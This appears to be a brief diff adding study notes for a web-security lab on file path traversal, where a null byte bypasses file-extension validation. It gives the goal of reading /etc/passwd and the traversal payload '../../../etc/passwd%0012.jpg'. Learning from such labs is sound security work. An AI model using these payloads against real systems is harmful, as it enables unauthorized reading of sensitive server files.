@@ -1,0 +1,8 @@
+Lab #6: File path traversal, validation of file extension with null byte bypass
+
+End goal: Retrieve the contents of the /etc/passwd file
+
+Analysis:
+../../../etc/passwd%0012.jpg
+
+Add null byte: %00
